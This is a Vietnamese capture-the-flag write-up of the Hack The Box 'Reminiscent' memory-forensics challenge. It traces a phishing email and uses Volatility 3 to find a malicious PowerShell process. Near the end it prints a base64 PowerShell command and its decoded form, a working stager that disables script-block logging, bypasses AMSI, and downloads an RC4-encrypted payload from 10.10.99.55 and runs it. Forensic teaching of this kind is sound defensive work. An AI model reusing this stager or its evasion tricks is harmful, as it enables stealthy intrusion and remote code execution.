## Đề 
> Suspicious traffic was detected from a recruiter&#039;s virtual PC. A memory dump of the offending VM was captured before it was removed from the network for imaging and analysis. Our recruiter mentioned he received an email from someone regarding their resume. A copy of the email was recovered and is provided for reference. Find and decode the source of the malware to find the flag.
## Link 
> https://app.hackthebox.com/challenges/reminiscent
## Giải 
- Đầu tiên em tải file từ link trên về 
- Ta được 3 file 
- Kiểm tra lần lượt 
# phân tích file Resume.eml
- Tại file `Resume.eml` nếu không đọc được có thể sử dụng các trang web đọc file email chẳng hạn như `https://www.encryptomatic.com/viewer/`
- Ở đây em đọc bằng lệnh strings
```text
Return-Path: <bloodworm@madlab.lcl>
Delivered-To: madlab.lcl-flounder@madlab.lcl
Received: (qmail 2609 invoked by uid 105); 3 Oct 2017 02:30:24 -0000
MIME-Version: 1.0
Content-Type: multipart/alternative;
 boundary="=_a8ebc8b42c157d88c1096632aeae0559"
Date: Mon, 02 Oct 2017 22:30:24 -0400
From: Brian Loodworm <bloodworm@madlab.lcl>
To: flounder@madlab.lcl
Subject: Resume
Organization: HackTheBox
Message-ID: <add77ed2ac38c3ab639246956c25b2c2@madlab.lcl>
X-Sender: bloodworm@madlab.lcl
Received: from mail.madlab.lcl (HELO mail.madlab.lcl) (127.0.0.1)
 by mail.madlab.lcl (qpsmtpd/0.96) with ESMTPSA (ECDHE-RSA-AES256-GCM-SHA384 encrypted); Mon, 02 Oct 2017 22:30:24 -0400
--=_a8ebc8b42c157d88c1096632aeae0559
Content-Transfer-Encoding: 7bit
Content-Type: text/plain; charset=US-ASCII
Hi Frank, someone told me you would be great to review my resume..
Could you have a look?
resume.zip [1] 
Links:
------
[1] http://10.10.99.55:8080/resume.zip
--=_a8ebc8b42c157d88c1096632aeae0559
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html; charset=UTF-8
<html><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
=3DUTF-8" /></head><body style=3D'font-size: 10pt; font-family: Verdana,Gen=
eva,sans-serif'>
<div class=3D"pre" style=3D"margin: 0; padding: 0; font-family: monospace">=
<br /> Hi Frank, someone told me you would be great to review my resume.. c=
uold you have a look?<br /> <br /><a href=3D"http://10.10.99.55:8080/resume=
=2Ezip">resume.zip</a></div>
</body></html>
--=_a8ebc8b42c157d88c1096632aeae0559--
```
- Tại đây ta thấy mail được gửi từ `bloodworm@madlab.lcl` đến `flounder@madlab.lcl` với đoạn tin nhắn là `Hi Frank, someone told me you would be great to review my resume..Could you have a look?` và 1 file resume.zip ở đường dẫn `http://10.10.99.55:8080/resume.zip` nhưng vấn đề là em không kết nối được 
# Phân tích file imageinfo.txt
- em dùng cat [file] để xem nội dung 
```text
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : VirtualBoxCoreDumpElf64 (Unnamed AS)
                     AS Layer3 : FileAddressSpace (/home/infosec/dumps/mem_dumps/01/flounder-pc-memdump.elf)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf800027fe0a0L
          Number of Processors : 2
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff800027ffd00L
                KPCR for CPU 1 : 0xfffff880009eb000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2017-10-04 18:07:30 UTC+0000
     Image local date and time : 2017-10-04 11:07:30 -0700
```
- Đây rõ ràng là được dump ra từ memory 
# Phân tích file flounder-pc-memdump.elf
- Vì phân tích file memory nên ta cần 1 số công cụ hỗ trợ, em dùng vol
> git clone https://github.com/volatilityfoundation/volatility3.git
- Bắt đầu phân tích
- Em sẽ xem cách dùng của công cụ này trước 
>  python3 vol.py -f /home/trongtam/Downloads/reminiscent/flounder-pc-memdump.elf -h 
```text
Volatility 3 Framework 2.5.2
usage: volatility [-h] [-c CONFIG] [--parallelism [{processes,threads,off}]] [-e EXTEND] [-p PLUGIN_DIRS] [-s SYMBOL_DIRS] [-v] [-l LOG] [-o OUTPUT_DIR] [-q]
                  [-r RENDERER] [-f FILE] [--write-config] [--save-config SAVE_CONFIG] [--clear-cache] [--cache-path CACHE_PATH] [--offline]
                  [--single-location SINGLE_LOCATION] [--stackers [STACKERS ...]] [--single-swap-locations [SINGLE_SWAP_LOCATIONS ...]]
                  plugin ...

An open-source memory forensics framework

options:
  -h, --help            Show this help message and exit, for specific plugin options use 'volatility <pluginname> --help'
  -c CONFIG, --config CONFIG
                        Load the configuration from a json file
  --parallelism [{processes,threads,off}]
                        Enables parallelism (defaults to off if no argument given)
  -e EXTEND, --extend EXTEND
                        Extend the configuration with a new (or changed) setting
  -p PLUGIN_DIRS, --plugin-dirs PLUGIN_DIRS
                        Semi-colon separated list of paths to find plugins
  -s SYMBOL_DIRS, --symbol-dirs SYMBOL_DIRS
                        Semi-colon separated list of paths to find symbols
  -v, --verbosity       Increase output verbosity
  -l LOG, --log LOG     Log output to a file as well as the console
  -o OUTPUT_DIR, --output-dir OUTPUT_DIR
                        Directory in which to output any generated files
  -q, --quiet           Remove progress feedback
  -r RENDERER, --renderer RENDERER
                        Determines how to render the output (quick, none, csv, pretty, json, jsonl)
  -f FILE, --file FILE  Shorthand for --single-location=file:// if single-location is not defined
  --write-config        Write configuration JSON file out to config.json
  --save-config SAVE_CONFIG
                        Save configuration JSON file to a file
  --clear-cache         Clears out all short-term cached items
  --cache-path CACHE_PATH
                        Change the default path (/home/trongtam/.cache/volatility3) used to store the cache
  --offline             Do not search online for additional JSON files
  --single-location SINGLE_LOCATION
                        Specifies a base location on which to stack
  --stackers [STACKERS ...]
                        List of stackers
  --single-swap-locations [SINGLE_SWAP_LOCATIONS ...]
                        Specifies a list of swap layer URIs for use with single-location

Plugins:
  For plugin specific options, run 'volatility <plugin> --help'

  plugin
    banners.Banners     Attempts to identify potential linux banners in an image
    configwriter.ConfigWriter
                        Runs the automagics and both prints and outputs configuration in the output directory.
    frameworkinfo.FrameworkInfo
                        Plugin to list the various modular components of Volatility
    isfinfo.IsfInfo     Determines information about the currently available ISF files, or a specific one
    layerwriter.LayerWriter
                        Runs the automagics and writes out the primary layer produced by the stacker.
    linux.bash.Bash     Recovers bash command history from memory.
    linux.capabilities.Capabilities
                        Lists process capabilities
    linux.check_afinfo.Check_afinfo
                        Verifies the operation function pointers of network protocols.
    linux.check_creds.Check_creds
                        Checks if any processes are sharing credential structures
    linux.check_idt.Check_idt
                        Checks if the IDT has been altered
    linux.check_modules.Check_modules
                        Compares module list to sysfs info, if available
    linux.check_syscall.Check_syscall
                        Check system call table for hooks.
    linux.elfs.Elfs     Lists all memory mapped ELF files for all processes.
    linux.envars.Envars
    linux.envvars.Envvars
                        Lists processes with their environment variables
    linux.iomem.IOMem   Generates an output similar to /proc/iomem on a running system.
    linux.keyboard_notifiers.Keyboard_notifiers
                        Parses the keyboard notifier call chain
    linux.kmsg.Kmsg     Kernel log buffer reader
    linux.lsmod.Lsmod   Lists loaded kernel modules.
    linux.lsof.Lsof     Lists all memory maps for all processes.
    linux.malfind.Malfind
                        Lists process memory ranges that potentially contain injected code.
    linux.mountinfo.MountInfo
                        Lists mount points on processes mount namespaces
    linux.proc.Maps     Lists all memory maps for all processes.
    linux.psaux.PsAux   Lists processes with their command line arguments
    linux.pslist.PsList
                        Lists the processes present in a particular linux memory image.
    linux.psscan.PsScan
                        Scans for processes present in a particular linux image.
    linux.pstree.PsTree
                        Plugin for listing processes in a tree based on their parent process ID.
    linux.sockstat.Sockstat
                        Lists all network connections for all processes.
    linux.tty_check.tty_check
                        Checks tty devices for hooks
    mac.bash.Bash       Recovers bash command history from memory.
    mac.check_syscall.Check_syscall
                        Check system call table for hooks.
    mac.check_sysctl.Check_sysctl
                        Check sysctl handlers for hooks.
    mac.check_trap_table.Check_trap_table
                        Check mach trap table for hooks.
    mac.ifconfig.Ifconfig
                        Lists network interface information for all devices
    mac.kauth_listeners.Kauth_listeners
                        Lists kauth listeners and their status
    mac.kauth_scopes.Kauth_scopes
                        Lists kauth scopes and their status
    mac.kevents.Kevents
                        Lists event handlers registered by processes
    mac.list_files.List_Files
                        Lists all open file descriptors for all processes.
    mac.lsmod.Lsmod     Lists loaded kernel modules.
    mac.lsof.Lsof       Lists all open file descriptors for all processes.
    mac.malfind.Malfind
                        Lists process memory ranges that potentially contain injected code.
    mac.mount.Mount     A module containing a collection of plugins that produce data typically found in Mac's mount command
    mac.netstat.Netstat
                        Lists all network connections for all processes.
    mac.proc_maps.Maps  Lists process memory ranges that potentially contain injected code.
    mac.psaux.Psaux     Recovers program command line arguments.
    mac.pslist.PsList   Lists the processes present in a particular mac memory image.
    mac.pstree.PsTree   Plugin for listing processes in a tree based on their parent process ID.
    mac.socket_filters.Socket_filters
                        Enumerates kernel socket filters.
    mac.timers.Timers   Check for malicious kernel timers.
    mac.trustedbsd.Trustedbsd
                        Checks for malicious trustedbsd modules
    mac.vfsevents.VFSevents
                        Lists processes that are filtering file system events
    timeliner.Timeliner
                        Runs all relevant plugins that provide time related information and orders the results by time.
    windows.bigpools.BigPools
                        List big page pools.
    windows.cachedump.Cachedump
                        Dumps lsa secrets from memory
    windows.callbacks.Callbacks
                        Lists kernel callbacks and notification routines.
    windows.cmdline.CmdLine
                        Lists process command line arguments.
    windows.crashinfo.Crashinfo
                        Lists the information from a Windows crash dump.
    windows.devicetree.DeviceTree
                        Listing tree based on drivers and attached devices in a particular windows memory image.
    windows.dlllist.DllList
                        Lists the loaded modules in a particular windows memory image.
    windows.driverirp.DriverIrp
                        List IRPs for drivers in a particular windows memory image.
    windows.drivermodule.DriverModule
                        Determines if any loaded drivers were hidden by a rootkit
    windows.driverscan.DriverScan
                        Scans for drivers present in a particular windows memory image.
    windows.dumpfiles.DumpFiles
                        Dumps cached file contents from Windows memory samples.
    windows.envars.Envars
                        Display process environment variables
    windows.filescan.FileScan
                        Scans for file objects present in a particular windows memory image.
    windows.getservicesids.GetServiceSIDs
                        Lists process token sids.
    windows.getsids.GetSIDs
                        Print the SIDs owning each process
    windows.handles.Handles
                        Lists process open handles.
    windows.hashdump.Hashdump
                        Dumps user hashes from memory
    windows.info.Info   Show OS & kernel details of the memory sample being analyzed.
    windows.joblinks.JobLinks
                        Print process job link information
    windows.ldrmodules.LdrModules
                        Lists the loaded modules in a particular windows memory image.
    windows.lsadump.Lsadump
                        Dumps lsa secrets from memory
    windows.malfind.Malfind
                        Lists process memory ranges that potentially contain injected code.
    windows.mbrscan.MBRScan
                        Scans for and parses potential Master Boot Records (MBRs)
    windows.memmap.Memmap
                        Prints the memory map
    windows.mftscan.MFTScan
                        Scans for MFT FILE objects present in a particular windows memory image.
    windows.modscan.ModScan
                        Scans for modules present in a particular windows memory image.
    windows.modules.Modules
                        Lists the loaded kernel modules.
    windows.mutantscan.MutantScan
                        Scans for mutexes present in a particular windows memory image.
    windows.netscan.NetScan
                        Scans for network objects present in a particular windows memory image.
    windows.netstat.NetStat
                        Traverses network tracking structures present in a particular windows memory image.
    windows.poolscanner.PoolScanner
                        A generic pool scanner plugin.
    windows.privileges.Privs
                        Lists process token privileges
    windows.pslist.PsList
                        Lists the processes present in a particular windows memory image.
    windows.psscan.PsScan
                        Scans for processes present in a particular windows memory image.
    windows.pstree.PsTree
                        Plugin for listing processes in a tree based on their parent process ID.
    windows.registry.certificates.Certificates
                        Lists the certificates in the registry's Certificate Store.
    windows.registry.hivelist.HiveList
                        Lists the registry hives present in a particular memory image.
    windows.registry.hivescan.HiveScan
                        Scans for registry hives present in a particular windows memory image.
    windows.registry.printkey.PrintKey
                        Lists the registry keys under a hive or specific key value.
    windows.registry.userassist.UserAssist
                        Print userassist registry keys and information.
    windows.sessions.Sessions
                        lists Processes with Session information extracted from Environmental Variables
    windows.skeleton_key_check.Skeleton_Key_Check
                        Looks for signs of Skeleton Key malware
    windows.ssdt.SSDT   Lists the system call table.
    windows.statistics.Statistics
                        Lists statistics about the memory space.
    windows.strings.Strings
                        Reads output from the strings command and indicates which process(es) each string belongs to.
    windows.svcscan.SvcScan
                        Scans for windows services.
    windows.symlinkscan.SymlinkScan
                        Scans for links present in a particular windows memory image.
    windows.vadinfo.VadInfo
                        Lists process memory ranges.
    windows.vadwalk.VadWalk
                        Walk the VAD tree.
    windows.vadyarascan.VadYaraScan
                        Scans all the Virtual Address Descriptor memory maps using yara.
    windows.verinfo.VerInfo
                        Lists version information from PE files.
    windows.virtmap.VirtMap
                        Lists virtual mapped sections.
    yarascan.YaraScan   Scans kernel memory using yara rules (string or file).
```
- Xem qua 1 số plugin thì thấy plugin `windows.pstree.PsTree` liệt kê ra các process và PID của chúng (dùng windows bởi vì nạn nhân dùng windows)
> python3 vol.py -f /home/trongtam/Downloads/reminiscent/flounder-pc-memdump.elf windows.pstree.PsTree
```text 
* 492   376     lsass.exe       0xfa8001ff2b30  8       590     0       False   2017-10-04 18:04:30.000000      N/A
2044    2012    explorer.exe    0xfa80020bb630  36      926     1       False   2017-10-04 18:04:41.000000      N/A
* 496   2044    powershell.exe  0xfa800224e060  12      300     1       False   2017-10-04 18:06:58.000000      N/A
** 2752 496     powershell.exe  0xfa8000839060  20      396     1       False   2017-10-04 18:07:00.000000      N/A
* 1476  2044    VBoxTray.exe    0xfa80022622e0  13      146     1       False   2017-10-04 18:04:42.000000      N/A
* 2812  2044    thunderbird.ex  0xfa80007e0b30  50      534     1       True    2017-10-04 18:06:24.000000      N/A
```
- powersell đang chạy ????. 
- Kiểm tra thời điểm xảy ra quá trình thử 
> python3 vol.py -f /home/trongtam/Downloads/reminiscent/flounder-pc-memdump.elf windows.netscan
```text
0x1f6c1010      UDPv4   0.0.0.0 0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000 
0x1f6c1010      UDPv6   ::      0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000 
0x1f6c2ec0      UDPv4   0.0.0.0 0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000 
0x1fc04490      TCPv4   10.10.100.43    49246   10.10.99.55     80      CLOSED  2752   powershell.exe
```
- Nó được chạy trên cổng 80 với PID là 2752
- Kiểm tra với PID --pid=[pid]
> python3 vol.py -f /home/trongtam/Downloads/reminiscent/flounder-pc-memdump.elf windows.cmdline --pid 2752
- Trong đó windows.cmdline để nhận lệnh còn --pid để lấy 1 tiến trình cụ thể 
```text
Volatility 3 Framework 2.5.2
Progress:  100.00               PDB scanning finished                        
PID     Process Args

2752    powershell.exe  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc JABHAHIAbwBVAFAAUABPAEwAaQBDAFkAUwBFAHQAdABJAE4ARwBzACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBzAGUATQBCAEwAWQAuAEcARQB0AFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAVABWAGEAbABVAGUAKAAkAG4AdQBsAEwAKQA7ACQARwBSAG8AdQBQAFAATwBsAEkAQwB5AFMAZQBUAFQAaQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAG8AdQBQAFAATwBMAEkAQwBZAFMARQB0AFQAaQBuAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAGUAZgBdAC4AQQBzAFMAZQBtAEIAbAB5AC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAGkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAHUARQAoACQATgB1AGwATAAsACQAVAByAHUAZQApAH0AOwBbAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBTAEUAcgBWAEkAYwBlAFAATwBJAG4AdABNAEEAbgBBAGcARQBSAF0AOgA6AEUAeABwAEUAYwB0ADEAMAAwAEMATwBuAFQAaQBuAHUARQA9ADAAOwAkAFcAQwA9AE4ARQBXAC0ATwBCAGoARQBjAFQAIABTAHkAcwBUAEUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAEkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAB3AEMALgBIAGUAYQBEAGUAcgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABXAGMALgBQAFIAbwBYAHkAPQBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBXAGUAYgBSAGUAcQB1AEUAcwB0AF0AOgA6AEQAZQBmAGEAVQBMAHQAVwBlAEIAUABSAE8AWABZADsAJAB3AEMALgBQAFIAbwBYAFkALgBDAFIARQBEAGUATgB0AEkAYQBMAFMAIAA9ACAAWwBTAFkAUwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AVABpAGEATABDAGEAQwBoAGUAXQA6ADoARABlAEYAYQB1AEwAVABOAEUAdAB3AE8AcgBrAEMAcgBlAGQAZQBuAHQAaQBBAGwAUwA7ACQASwA9AFsAUwBZAFMAdABFAE0ALgBUAGUAeAB0AC4ARQBOAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQB0AEUAcwAoACcARQAxAGcATQBHAGQAZgBUAEAAZQBvAE4APgB4ADkAewBdADIARgA3ACsAYgBzAE8AbgA0AC8AUwBpAFEAcgB3ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBjAC4ASABFAEEAZABFAHIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ATQBDAGEAaAB1AFEAVgBmAHoAMAB5AE0ANgBWAEIAZQA4AGYAegBWADkAdAA5AGoAbwBtAG8APQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADkAOQAuADUANQA6ADgAMAAnADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABmAGwAYQBnAD0AJwBIAFQAQgB7ACQAXwBqADAARwBfAHkAMAB1AFIAXwBNADMAbQAwAHIAWQBfACQAfQAnADsAJABEAGEAdABBAD0AJABXAEMALgBEAG8AVwBOAEwAbwBhAEQARABBAFQAQQAoACQAUwBlAFIAKwAkAHQAKQA7ACQAaQB2AD0AJABkAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABhAD0AJABEAGEAVABhAFsANAAuAC4AJABEAEEAdABhAC4ATABlAG4ARwBUAEgAXQA7AC0ASgBPAEkATgBbAEMASABBAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=

```
- Có vẻ đây là mã base64
- Decode ra : `$GroUPPOLiCYSEttINGs = [rEF].ASseMBLY.GEtTypE('System.Management.Automation.Utils')."GEtFIE`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static').GETValUe($nulL);$GRouPPOlICySeTTiNgS['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0;$GRouPPOLICYSEtTingS['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0;[Ref].AsSemBly.GeTTyPE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GEtFieLd('amsiInitFailed','NonPublic,Static').SETVaLuE($NulL,$True)};[SysTem.NeT.SErVIcePOIntMAnAgER]::ExpEct100COnTinuE=0;$WC=NEW-OBjEcT SysTEM.NEt.WeBClIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaDerS.Add('User-Agent',$u);$Wc.PRoXy=[SysTeM.NET.WebRequEst]::DefaULtWeBPROXY;$wC.PRoXY.CREDeNtIaLS = [SYSTeM.NET.CreDEnTiaLCaChe]::DeFauLTNEtwOrkCredentiAlS;$K=[SYStEM.Text.ENCODIng]::ASCII.GEtBytEs('E1gMGdfT@eoN>x9{]2F7+bsOn4/SiQrw');$R={$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxoR$S[($S[$I]+$S[$H])%256]}};$wc.HEAdErs.ADD("Cookie","session=MCahuQVfz0yM6VBe8fzV9t9jomo=");$ser='http://10.10.99.55:80';$t='/login/process.php';$flag='HTB{$_j0G_y0uR_M3m0rY_$}';$DatA=$WC.DoWNLoaDDATA($SeR+$t);$iv=$daTA[0..3];$DAta=$DaTa[4..$DAta.LenGTH];-JOIN[CHAr[]](& $R $datA ($IV+$K))|IEX`
- Flag là : `HTB{$_j0G_y0uR_M3m0rY_$}`
